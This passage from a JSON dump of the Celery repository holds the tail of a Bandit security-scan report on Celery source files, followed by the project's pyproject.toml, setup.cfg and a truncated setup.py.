\"issue_severity\": \"LOW\",\n      \"issue_text\": \"Starting a process without a shell.\",\n      \"line_number\": 125,\n      \"line_range\": [\n        125\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b606_start_process_with_no_shell.html\",\n      \"test_id\": \"B606\",\n      \"test_name\": \"start_process_with_no_shell\"\n    },\n    {\n      \"code\": \"22 from numbers import Integral\\n23 from pickle import HIGHEST_PROTOCOL\\n24 from struct import pack, unpack, unpack_from\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with HIGHEST_PROTOCOL module.\",\n      \"line_number\": 23,\n      \"line_range\": [\n        23\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b403-import-pickle\",\n      \"test_id\": \"B403\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"607                     proc in waiting_to_start):\\n608                 assert proc.outqR_fd in fileno_to_outq\\n609                 assert fileno_to_outq[proc.outqR_fd] is proc\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 608,\n      \"line_range\": [\n        608\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"608                 assert proc.outqR_fd in fileno_to_outq\\n609                 assert fileno_to_outq[proc.outqR_fd] is proc\\n610                 assert proc.outqR_fd in hub.readers\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 609,\n      \"line_range\": [\n        609\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"609                 assert fileno_to_outq[proc.outqR_fd] is proc\\n610                 assert proc.outqR_fd in hub.readers\\n611                 error('Timed out waiting for UP message from %r', proc)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 610,\n      \"line_range\": [\n        610\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"630 \\n631             assert not isblocking(proc.outq._reader)\\n632 \\n633             # handle_result_event is called when the processes outqueue is\\n634             # readable.\\n635             add_reader(proc.outqR_fd, handle_result_event, proc.outqR_fd)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 631,\n      \"line_range\": [\n        631,\n        632,\n        633,\n        634\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1088         synq = None\\n1089         assert isblocking(inq._reader)\\n1090         assert not isblocking(inq._writer)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1089,\n      \"line_range\": [\n        1089\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1089         assert isblocking(inq._reader)\\n1090         assert not isblocking(inq._writer)\\n1091         assert not isblocking(outq._reader)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1090,\n      \"line_range\": [\n        1090\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1090         assert not isblocking(inq._writer)\\n1091         assert not isblocking(outq._reader)\\n1092         assert isblocking(outq._writer)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1091,\n      \"line_range\": [\n        1091\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1091         assert not isblocking(outq._reader)\\n1092         assert isblocking(outq._writer)\\n1093         if self.synack:\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1092,\n      \"line_range\": [\n        1092\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1094             synq = _SimpleQueue(wnonblock=True)\\n1095             assert isblocking(synq._reader)\\n1096             assert not isblocking(synq._writer)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1095,\n      \"line_range\": [\n        1095\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1095             assert isblocking(synq._reader)\\n1096             assert not isblocking(synq._writer)\\n1097         return inq, outq, synq\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1096,\n      \"line_range\": [\n        1096\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1107             return logger.warning('process with pid=%s already exited', pid)\\n1108         assert proc.inqW_fd not in self._fileno_to_inq\\n1109         assert proc.inqW_fd not in self._all_inqueues\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1108,\n      \"line_range\": [\n        1108\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1108         assert proc.inqW_fd not in self._fileno_to_inq\\n1109         assert proc.inqW_fd not in self._all_inqueues\\n1110         self._waiting_to_start.discard(proc)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1109,\n      \"line_range\": [\n        1109\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1187         \\\"\\\"\\\"Mark new ownership for ``queues`` to update fileno indices.\\\"\\\"\\\"\\n1188         assert queues in self._queues\\n1189         b = len(self._queues)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1188,\n      \"line_range\": [\n        1188\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1190         self._queues[queues] = proc\\n1191         assert b == len(self._queues)\\n1192 \\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1191,\n      \"line_range\": [\n        1191\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1270                 pass\\n1271             assert len(self._queues) == before\\n1272 \\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1271,\n      \"line_range\": [\n        1271\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"1277         \\\"\\\"\\\"\\n1278         assert not proc._is_alive()\\n1279         self._waiting_to_start.discard(proc)\\n\",\n      \"filename\": \"celery/concurrency/asynpool.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 1278,\n      \"line_range\": [\n        1278\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"85             with allow_join_result():\\n86                 assert ping.delay().get(timeout=ping_task_timeout) == 'pong'\\n87 \\n\",\n      \"filename\": \"celery/contrib/testing/worker.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 86,\n      \"line_range\": [\n        86\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"109     if perform_ping_check:\\n110         assert 'celery.ping' in app.tasks\\n111     # Make sure we can connect to the broker\\n\",\n      \"filename\": \"celery/contrib/testing/worker.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 110,\n      \"line_range\": [\n        110\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"169                 return self.win.getkey().upper()\\n170             except Exception:  # pylint: disable=broad-except\\n171                 pass\\n172 \\n\",\n      \"filename\": \"celery/events/cursesmon.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Try, Except, Pass detected.\",\n      \"line_number\": 170,\n      \"line_range\": [\n        170,\n        171\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b110_try_except_pass.html\",\n      \"test_id\": \"B110\",\n      \"test_name\": \"try_except_pass\"\n    },\n    {\n      \"code\": \"488         max_groups = os.sysconf('SC_NGROUPS_MAX')\\n489     except Exception:  # pylint: disable=broad-except\\n490         pass\\n491     try:\\n\",\n      \"filename\": \"celery/platforms.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Try, Except, Pass detected.\",\n      \"line_number\": 489,\n      \"line_range\": [\n        489,\n        490\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b110_try_except_pass.html\",\n      \"test_id\": \"B110\",\n      \"test_name\": \"try_except_pass\"\n    },\n    {\n      \"code\": \"27         \\\"\\\"\\\"Serialize data structure into string.\\\"\\\"\\\"\\n28         assert self._key is not None\\n29         assert self._cert is not None\\n\",\n      \"filename\": \"celery/security/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 28,\n      \"line_range\": [\n        28\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"28         assert self._key is not None\\n29         assert self._cert is not None\\n30         with reraise_errors('Unable to serialize: {0!r}', (Exception,)):\\n\",\n      \"filename\": \"celery/security/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 29,\n      \"line_range\": [\n        29\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"43         \\\"\\\"\\\"Deserialize data structure from string.\\\"\\\"\\\"\\n44         assert self._cert_store is not None\\n45         with reraise_errors('Unable to deserialize: {0!r}', (Exception,)):\\n\",\n      \"filename\": \"celery/security/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 44,\n      \"line_range\": [\n        44\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"14     \\\"\\\"\\\"Convert string to hash object of cryptography library.\\\"\\\"\\\"\\n15     assert digest is not None\\n16     return getattr(hashes, digest.upper())()\\n\",\n      \"filename\": \"celery/security/utils.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 15,\n      \"line_range\": [\n        15\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"184     def _connect_signal(self, receiver, sender, weak, dispatch_uid):\\n185         assert callable(receiver), 'Signal receivers must be callable'\\n186         if not fun_accepts_kwargs(receiver):\\n\",\n      \"filename\": \"celery/utils/dispatch/signal.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 185,\n      \"line_range\": [\n        185\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"332     # Tasks are rarely, if ever, created at runtime - exec here is fine.\\n333     exec(definition, namespace)\\n334     result = namespace[name]\\n\",\n      \"filename\": \"celery/utils/functional.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"MEDIUM\",\n      \"issue_text\": \"Use of exec detected.\",\n      \"line_number\": 333,\n      \"line_range\": [\n        333\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b102_exec_used.html\",\n      \"test_id\": \"B102\",\n      \"test_name\": \"exec_used\"\n    },\n    {\n      \"code\": \"13 try:\\n14     import cPickle as pickle\\n15 except ImportError:\\n\",\n      \"filename\": \"celery/utils/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with cPickle module.\",\n      \"line_number\": 14,\n      \"line_range\": [\n        14\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b403-import-pickle\",\n      \"test_id\": \"B403\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"15 except ImportError:\\n16     import pickle\\n17 \\n\",\n      \"filename\": \"celery/utils/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with pickle module.\",\n      \"line_number\": 16,\n      \"line_range\": [\n        16\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b403-import-pickle\",\n      \"test_id\": \"B403\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"62             loads(dumps(superexc))\\n63         except Exception:  # pylint: disable=broad-except\\n64             pass\\n65         else:\\n\",\n      \"filename\": \"celery/utils/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Try, Except, Pass detected.\",\n      \"line_number\": 63,\n      \"line_range\": [\n        63,\n        64\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b110_try_except_pass.html\",\n      \"test_id\": \"B110\",\n      \"test_name\": \"try_except_pass\"\n    },\n    {\n      \"code\": \"156     try:\\n157         pickle.loads(pickle.dumps(exc))\\n158     except Exception:  # pylint: disable=broad-except\\n\",\n      \"filename\": \"celery/utils/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"MEDIUM\",\n      \"issue_text\": \"Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.\",\n      \"line_number\": 157,\n      \"line_range\": [\n        157\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-pickle\",\n      \"test_id\": \"B301\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"157         pickle.loads(pickle.dumps(exc))\\n158     except Exception:  # pylint: disable=broad-except\\n159         pass\\n160     else:\\n\",\n      \"filename\": \"celery/utils/serialization.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Try, Except, Pass detected.\",\n      \"line_number\": 158,\n      \"line_range\": [\n        158,\n        159\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b110_try_except_pass.html\",\n      \"test_id\": \"B110\",\n      \"test_name\": \"try_except_pass\"\n    },\n    {\n      \"code\": \"385     if full_jitter:\\n386         countdown = random.randrange(countdown + 1)\\n387     # Adjust according to maximum wait time and account for negative values.\\n\",\n      \"filename\": \"celery/utils/time.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Standard pseudo-random generators are not suitable for security/cryptographic purposes.\",\n      \"line_number\": 386,\n      \"line_range\": [\n        386\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b311-random\",\n      \"test_id\": \"B311\",\n      \"test_name\": \"blacklist\"\n    },\n    {\n      \"code\": \"75 \\n76         assert self.keepalive, 'cannot scale down too fast.'\\n77 \\n\",\n      \"filename\": \"celery/worker/autoscale.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Use of assert detected. The enclosed code will be removed when compiling to optimised byte code.\",\n      \"line_number\": 76,\n      \"line_range\": [\n        76\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b101_assert_used.html\",\n      \"test_id\": \"B101\",\n      \"test_name\": \"assert_used\"\n    },\n    {\n      \"code\": \"350             self.connection.collect()\\n351         except Exception:  # pylint: disable=broad-except\\n352             pass\\n353 \\n\",\n      \"filename\": \"celery/worker/consumer/consumer.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Try, Except, Pass detected.\",\n      \"line_number\": 351,\n      \"line_range\": [\n        351,\n        352\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/plugins/b110_try_except_pass.html\",\n      \"test_id\": \"B110\",\n      \"test_name\": \"try_except_pass\"\n    },\n    {\n      \"code\": \"7 import platform\\n8 import shelve\\n9 import sys\\n\",\n      \"filename\": \"celery/worker/state.py\",\n      \"issue_confidence\": \"HIGH\",\n      \"issue_severity\": \"LOW\",\n      \"issue_text\": \"Consider possible security implications associated with shelve module.\",\n      \"line_number\": 8,\n      \"line_range\": [\n        8\n      ],\n      \"more_info\": \"https://bandit.readthedocs.io/en/latest/blacklists/blacklist_imports.html#b403-import-pickle\",\n      \"test_id\": \"B403\",\n      \"test_name\": \"blacklist\"\n    }\n  ]\n"
        },
        {
          "name": "celery",
          "type": "tree",
          "content": null
        },
        {
          "name": "docker",
          "type": "tree",
          "content": null
        },
        {
          "name": "docs",
          "type": "tree",
          "content": null
        },
        {
          "name": "examples",
          "type": "tree",
          "content": null
        },
        {
          "name": "extra",
          "type": "tree",
          "content": null
        },
        {
          "name": "helm-chart",
          "type": "tree",
          "content": null
        },
        {
          "name": "pyproject.toml",
          "type": "blob",
          "size": 1.34,
          "content": "[tool.pytest.ini_options]\naddopts = \"--strict-markers\"\ntestpaths = \"t/unit/\"\npython_classes = \"test_*\"\nxfail_strict=true\nmarkers = [\"sleepdeprived_patched_module\", \"masked_modules\", \"patched_environ\", \"patched_module\", \"flaky\", \"timeout\"]\n\n[tool.mypy]\nwarn_unused_configs = true\nstrict = false\nfollow_imports = \"skip\"\nshow_error_codes = true\ndisallow_untyped_defs = true\nignore_missing_imports = true\nfiles = [\n    \"celery/__main__.py\",\n    \"celery/states.py\",\n    \"celery/signals.py\",\n    \"celery/fixups\",\n    \"celery/concurrency/thread.py\",\n    \"celery/security/certificate.py\",\n    \"celery/utils/text.py\",\n    \"celery/schedules.py\",\n    \"celery/apps/beat.py\",\n]\n\n[tool.codespell]\nignore-words-list = \"assertin\"\nskip = \"./.*,docs/AUTHORS.txt,docs/history/*,docs/spelling_wordlist.txt,Changelog.rst,CONTRIBUTORS.txt,*.key\"\n\n[tool.coverage.run]\nbranch = true\ncover_pylib = false\ninclude = [\"*celery/*\"]\nomit = [\"celery.tests.*\"]\n\n[tool.coverage.report]\nexclude_lines = [\n    \"pragma: no cover\",\n    \"if TYPE_CHECKING:\",\n    \"except ImportError:\"\n]\nomit = [\n    \"*/python?.?/*\",\n    \"*/site-packages/*\",\n    \"*/pypy/*\",\n    \"*/celery/bin/graph.py\",\n    \"*celery/bin/logtool.py\",\n    \"*celery/task/base.py\",\n    \"*celery/contrib/sphinx.py\",\n    \"*celery/concurrency/asynpool.py\",\n    \"*celery/utils/debug.py\",\n    \"*celery/contrib/testing/*\",\n    \"*celery/contrib/pytest.py\"\n]\n"
        },
        {
          "name": "requirements",
          "type": "tree",
          "content": null
        },
        {
          "name": "setup.cfg",
          "type": "blob",
          "size": 1.08,
          "content": "[build_sphinx]\nsource-dir = docs/\nbuild-dir = docs/_build\nall_files = 1\n\n[flake8]\n# classes can be lowercase, arguments and variables can be uppercase\n# whenever it makes the code more readable.\nmax-line-length = 117\nextend-ignore =\n    # incompatible with black https://github.com/psf/black/issues/315#issuecomment-395457972\n    E203,\n    # Missing docstring in public method\n    D102,\n    # Missing docstring in public package\n    D104,\n    # Missing docstring in magic method\n    D105,\n    # Missing docstring in __init__\n    D107,\n    # First line should be in imperative mood; try rephrasing\n    D401,\n    # No blank lines allowed between a section header and its content\n    D412,\n    # ambiguous variable name '...'\n    E741,\n    # ambiguous class definition '...'\n    E742,\nper-file-ignores =\n   t/*,setup.py,examples/*,docs/*,extra/*:\n       # docstrings\n       D,\n\n[bdist_rpm]\nrequires = backports.zoneinfo>=0.2.1;python_version<'3.9'\n           tzdata>=2022.7\n           billiard >=4.1.0,<5.0\n           kombu >= 5.3.4,<6.0.0\n\n[bdist_wheel]\nuniversal = 0\n\n[metadata]\nlicense_files = LICENSE\n"
        },
        {
          "name": "setup.py",
          "type": "blob",
          "size": 4.58,
          "content": "#!/usr/bin/env python3\nimport codecs\nimport os\nimport re\n\nimport setuptools\n\nNAME = 'celery'\n\n# -*- Extras -*-\n\nEXTENSIONS = {\n    'arangodb',\n    'auth',\n    'azureblockblob',\n    'brotli',\n    'cassandra',\n    'consul',\n    'cosmosdbsql',\n    'couchbase',\n    'couchdb',\n    'django',\n    'dynamodb',\n    'elasticsearch',\n    'eventlet',\n    'gevent',\n    'gcs',\n    'librabbitmq',\n    'memcache',\n    'mongodb',\n    'msgpack',\n    'pymemcache',\n    'pydantic',\n    'pyro',\n    'pytest',\n    'redis',\n    's3',\n    'slmq',\n    'solar',\n    'sqlalchemy',\n    'sqs',\n    'tblib',\n    'yaml',\n    'zookeeper',\n    'zstd'\n}\n\n# -*- Distribution Meta -*-\n\nre_meta = re.compile(r'__(\\w+?)__\\s*=\\s*(.*)')\nre_doc = re.compile(r'^\"\"\"(.+?)\"\"\"')\n\n\ndef _add_default(m):\n    attr_name, attr_value = m.groups()\n    return ((attr_name, attr_value.strip(\"\\\"'\")),)\n\n\ndef _add_doc(m):\n    return (('doc', m.groups()[0]),)\n\n\ndef parse_dist_meta():\n    \"\"\"Extract metadata information from ``$dist/__init__.py``.\"\"\"\n    pats = {re_meta: _add_default, re_doc: _add_doc}\n    here = os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(here, NAME, '__init__.py')) as meta_fh:\n        distmeta = {}\n        for line in meta_fh:\n            if line.strip() == '# -eof meta-':\n                break\n            for pattern, handler in pats.items():\n                m = pattern.match(line.strip())\n                if m:\n                    distmeta.update(handler(m))\n        return distmeta\n\n# -*- Requirements -*-\n\n\ndef _strip_comments(l):\n    return l.split('#', 1)[0].strip()\n\n\ndef _pip_requirement(req):\n    if req.startswith('-r '):\n        _, path = req.split()\n        return reqs(*path.split('/'))\n    return [req]\n\n\ndef _reqs(*f):\n    return [\n        _pip_requirement(r) for r in (\n            _strip_comments(l) for l in open(\n                os.path.join(os.getcwd(), 'requirements', *f)).readlines()\n        ) if r]\n\n\ndef reqs(*f):\n    \"\"\"Parse requirement file.\n\n    Example:\n        reqs('default.txt')          # requirements/default.txt\n        reqs('extras', 'redis.txt')  # requirements/extras/redis.txt\n    Returns:\n        List[str]: list of requirements specified in the file.\n    \"\"\"\n    return [req for subreq in _reqs(*f) for req in subreq]\n\n\ndef extras(*p):\n    \"\"\"Parse requirement in the requirements/extras/ directory.\"\"\"\n    return reqs('extras', *p)\n\n\ndef install_requires():\n    \"\"\"Get list of requirements required for installation.\"\"\"\n    return reqs('default.txt')\n\n\ndef extras_require():\n    \"\"\"Get map of all extra requirements.\"\"\"\n    return {x: extras(x + '.txt') for x in EXTENSIONS}\n\n# -*- Long Description -*-\n\n\ndef long_description():\n    try:\n        return codecs.open('README.rst', 'r', 'utf-8').read()\n    except OSError:\n        return 'Long description error: Missing README.rst file'\n\n\nmeta = parse_dist_meta()\nsetuptools.setup(\n    name=NAME,\n    packages=setuptools.find_packages(exclude=['t', 't.*']),\n    version=meta['version'],\n    description=meta['doc'],\n    long_description=long_description(),\n    keywords=meta['keywords'],\n    author=meta['author'],\n    author_email=meta['contact'],\n    url=meta['homepage'],\n    license='BSD-3-Clause',\n    platforms=['any'],\n    install_requires=install_requires(),\n    python_requires=\">=3.8\",\n    tests_require=reqs('test.txt'),\n    extras_require=extras_require(),\n    include_package_data=True,\n    entry_points={\n        'console_scripts': [\n            'celery = celery.__main__:main',\n        ]\n    },\n    project_urls={\n        \"Documentation\": \"https://docs.celeryq.dev/en/stable/\",\n        \"Changelog\": \"https://docs.celeryq.dev/en/stable/changelog.html\",\n        \"Code\": \"https://github.com/celery/celery\",\n        \"Tracker\": \"https://github.com/celery/celery/issues\",\n        \"Funding\": \"https://opencollective.com/celery\"\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Topic :: System :: Distributed Computing\",\n        \"Topic :: Software Development :: Object Brokering\",\n        \"Framework :: Celery\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3.12\",\n        \"Programming Language :: Python :: 3.13\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming 